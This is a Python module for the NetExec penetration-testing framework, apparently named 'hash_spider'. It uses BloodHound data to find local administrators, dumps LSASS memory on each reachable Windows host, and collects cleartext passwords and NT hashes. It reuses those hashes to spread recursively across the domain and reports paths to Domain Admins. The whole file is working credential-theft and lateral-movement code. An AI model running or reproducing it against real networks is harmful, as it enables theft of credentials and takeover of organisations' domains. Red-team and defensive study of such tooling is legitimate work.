# Author: Peter Gormington (@hackerm00n on Twitter)
import logging
from sqlite3 import connect
from sys import exit
from neo4j import GraphDatabase, basic_auth
from neo4j.exceptions import AuthError, ServiceUnavailable
from lsassy.dumper import Dumper
from lsassy.parser import Parser
from lsassy.session import Session
from lsassy.impacketfile import ImpacketFile

credentials_data = []
found_users = []
reported_da = []


def neo4j_conn(context, connection, driver):
    if connection.config.get("BloodHound", "bh_enabled") != "False":
        context.log.display("Connecting to Neo4j/Bloodhound.")
        try:
            session = driver.session()
            list(session.run("MATCH (g:Group) return g LIMIT 1"))
            context.log.display("Connection Successful!")
        except AuthError:
            context.log.fail("Invalid credentials")
        except ServiceUnavailable:
            context.log.fail("Could not connect to neo4j database")
        except Exception as e:
            context.log.fail("Error querying domain admins")
            context.log.debug(e)
    else:
        context.log.fail("BloodHound not marked enabled. Check nxc.conf")
        exit(1)


def neo4j_local_admins(context, driver):
    try:
        session = driver.session()
        admins = session.run("MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS ORDER BY ADMIN_COUNT DESC")  # This query pulls all PCs and their local admins from Bloodhound. Based on: https://github.com/xenoscr/Useful-BloodHound-Queries/blob/master/List-Queries.md and other similar posts
        context.log.success("Admins and PCs obtained")
    except Exception as e:
        context.log.fail(f"Could not pull admins: {e}")
        return None
    return list(admins.data())


def create_db(local_admins, dbconnection, cursor):
    cursor.execute("""CREATE TABLE if not exists pc_and_admins ("pc_name" TEXT UNIQUE, "local_admins" TEXT, "dumped" TEXT)""")
    for result in local_admins:
        cursor.execute(
            "INSERT OR IGNORE INTO pc_and_admins(pc_name, local_admins, dumped) VALUES(?, ?, ?)",
            (
                result.get("COMPUTER"),
                str(
                    result.get("USERS"),
                ),
                "FALSE",
            ),
        )
    dbconnection.commit()
    cursor.execute("""CREATE TABLE if not exists admin_users("username" TEXT UNIQUE, "hash" TEXT, "password" TEXT)""")
    admin_users = []
    for result in local_admins:
        for user in result.get("USERS"):
            if user not in admin_users:
                admin_users.append(user)
    for user in admin_users:
        cursor.execute("INSERT OR IGNORE INTO admin_users(username) VALUES(?)", [user])
    dbconnection.commit()


def process_creds(context, connection, credentials_data, dbconnection, cursor, driver):
    domain = connection.conn.getServerDNSDomainName() if connection.args.local_auth else connection.domain
    for result in credentials_data:
        username = result["username"].upper().split("@")[0]
        nthash = result["nthash"]
        password = result["password"]
        if result["password"] is not None:
            context.log.highlight(f"Found a cleartext password for: {username}:{password}. Adding to the DB and marking user as owned in BH.")
            cursor.execute(
                "UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'",
                [password],
            )
            username = f"{username.upper()}@{domain.upper()}"
            dbconnection.commit()
            session = driver.session()
            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
        if nthash == "aad3b435b51404eeaad3b435b51404ee" or nthash == "31d6cfe0d16ae931b73c59d7e0c089c0":
            context.log.fail(f"Hash for {username} is expired.")
        elif username not in found_users and nthash is not None:
            context.log.highlight(f"Found hashes for: '{username}:{nthash}'. Adding them to the DB and marking user as owned in BH.")
            found_users.append(username)
            cursor.execute(
                "UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'",
                [nthash],
            )
            dbconnection.commit()
            username = f"{username.upper()}@{domain.upper()}"
            session = driver.session()
            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
            path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.owned=true AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
            paths = list(path_to_da.data())

            for path in paths:
                if path:
                    for value in path.values():
                        for item in value:
                            if isinstance(item, dict):
                                if {item["name"]} not in reported_da:
                                    context.log.success(f"You have a valid path to DA as {item['name']}.")
                                    reported_da.append({item["name"]})
                                exit()


def initial_run(connection, cursor):
    username = connection.username
    password = getattr(connection, "password", "")
    nthash = getattr(connection, "nthash", "")
    cursor.execute(
        "UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'",
        [password],
    )
    cursor.execute(
        "UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'",
        [nthash],
    )


class NXCModule:
    name = "hash_spider"
    description = "Dump lsass recursively from a given hash using BH to find local admins"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.reset = None
        self.reset_dumped = None
        self.method = None

    @staticmethod
    def save_credentials(context, connection, domain, username, password, lmhash, nthash):
        host_id = context.db.get_hosts(connection.host)[0][0]
        if password is not None:
            credential_type = "plaintext"
        else:
            credential_type = "hash"
            password = ":".join(h for h in [lmhash, nthash] if h is not None)
        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)

    def options(self, context, module_options):
        """
        METHOD              Method to use to dump lsass.exe with lsassy
        RESET_DUMPED        Allows re-dumping of hosts. (Default: False)
        RESET               Reset DB. (Default: False)
        """
        self.method = "comsvcs"
        if "METHOD" in module_options:
            self.method = module_options["METHOD"]
        self.reset_dumped = module_options.get("RESET_DUMPED", False)
        self.reset = module_options.get("RESET", False)

    def run_lsassy(self, context, connection, cursor):  # copied and pasted from lsassy_dumper & added cursor
        # lsassy uses a custom "success" level, which requires initializing its logger or an error will be thrown
        # lsassy also removes all other handlers and overwrites the formatter which is bad (we want ours)
        # so what we do is define "success" as a logging level, then do nothing with the output
        logging.addLevelName(25, "SUCCESS")
        logging.success = lambda message, *args: ()

        host = connection.host
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")
        session = Session()
        session.get_session(
            address=host,
            target_ip=host,
            port=445,
            lmhash=lmhash,
            nthash=nthash,
            username=username,
            password=password,
            domain=domain_name,
        )
        if session.smb_session is None:
            context.log.fail("Couldn't connect to remote host. Password likely expired/changed. Removing from DB.")
            cursor.execute(f"UPDATE admin_users SET hash = NULL WHERE username LIKE '{username}'")
            return False
        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
        if dumper is None:
            context.log.fail(f"Unable to load dump method '{self.method}'")
            return False
        file = dumper.dump()
        if file is None:
            context.log.fail("Unable to dump lsass")
            return False
        credentials, tickets, masterkeys = Parser(host, file).parse()
        file.close()
        ImpacketFile.delete(session, file.get_file_path())
        if credentials is None:
            credentials = []
        credentials = [cred.get_object() for cred in credentials if not cred.get_username().endswith("$")]
        credentials_unique = []
        credentials_output = []
        for cred in credentials:
            if [
                cred["domain"],
                cred["username"],
                cred["password"],
                cred["lmhash"],
                cred["nthash"],
            ] not in credentials_unique:
                credentials_unique.append(
                    [
                        cred["domain"],
                        cred["username"],
                        cred["password"],
                        cred["lmhash"],
                        cred["nthash"],
                    ]
                )
                credentials_output.append(cred)
                self.save_credentials(context, connection, cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"])
        global credentials_data
        credentials_data = credentials_output

    def spider_pcs(self, context, connection, cursor, dbconnection, driver):
        cursor.execute("SELECT * from admin_users WHERE hash is not NULL")
        compromised_users = cursor.fetchall()
        cursor.execute("SELECT pc_name,local_admins FROM pc_and_admins WHERE dumped LIKE 'FALSE'")
        admin_access = cursor.fetchall()
        for user in compromised_users:
            for pc in admin_access:
                if user[0] in pc[1]:
                    cursor.execute(f"SELECT * FROM pc_and_admins WHERE pc_name = '{pc[0]}' AND dumped NOT LIKE 'TRUE'")
                    more_to_dump = cursor.fetchall()
                    if len(more_to_dump) > 0:
                        context.log.display(f"User {user[0]} has more access to {pc[0]}. Attempting to dump.")
                        connection.domain = user[0].split("@")[1]
                        connection.host = pc[0].split(".")[0]
                        connection.username = user[0].split("@")[0]
                        connection.nthash = user[1]
                        connection.nthash = user[1]
                        try:
                            self.run_lsassy(context, connection, cursor)
                            cursor.execute("UPDATE pc_and_admins SET dumped = 'TRUE' WHERE pc_name LIKE '" + pc[0] + "%'")

                            process_creds(
                                context,
                                connection,
                                credentials_data,
                                dbconnection,
                                cursor,
                                driver,
                            )
                            self.spider_pcs(context, connection, cursor, dbconnection, driver)
                        except Exception:
                            context.log.fail(f"Failed to dump lsassy on {pc[0]}")
        if len(admin_access) > 0:
            context.log.fail("No more local admin access known. Please try re-running Bloodhound with newly found accounts.")
            exit()

    def on_admin_login(self, context, connection):
        db_path = connection.config.get("nxc", "workspace")
        # DB will be saved at ./NetExec/hash_spider_default.sqlite3 if workspace in nxc.conf is "default"
        db_name = f"hash_spider_{db_path}.sqlite3"
        dbconnection = connect(db_name, check_same_thread=False, isolation_level=None)

        cursor = dbconnection.cursor()
        if self.reset:
            try:
                cursor.execute("DROP TABLE IF EXISTS admin_users;")
                cursor.execute("DROP TABLE IF EXISTS pc_and_admins;")
                context.log.display("Database reset")
                exit()
            except Exception as e:
                context.log.fail("Database reset error", str(e))
                exit()

        if self.reset_dumped:
            try:
                cursor.execute("UPDATE pc_and_admins SET dumped = 'False'")
                context.log.display("PCs can be dumped again.")
            except Exception as e:
                context.log.fail("Database update error", str(e))
                exit()

        neo4j_user = connection.config.get("BloodHound", "bh_user")
        neo4j_pass = connection.config.get("BloodHound", "bh_pass")
        neo4j_uri = connection.config.get("BloodHound", "bh_uri")
        neo4j_port = connection.config.get("BloodHound", "bh_port")
        neo4j_db = f"bolt://{neo4j_uri}:{neo4j_port}"
        driver = GraphDatabase.driver(neo4j_db, auth=basic_auth(neo4j_user, neo4j_pass), encrypted=False)
        neo4j_conn(context, connection, driver)
        admin_results = neo4j_local_admins(context, driver)
        create_db(admin_results, dbconnection, cursor)
        initial_run(connection, cursor)
        context.log.display("Running lsassy")
        self.run_lsassy(context, connection, cursor)
        process_creds(context, connection, credentials_data, dbconnection, cursor, driver)
        context.log.display("🕷️ Starting to spider 🕷️")
        self.spider_pcs(context, connection, cursor, dbconnection, driver)
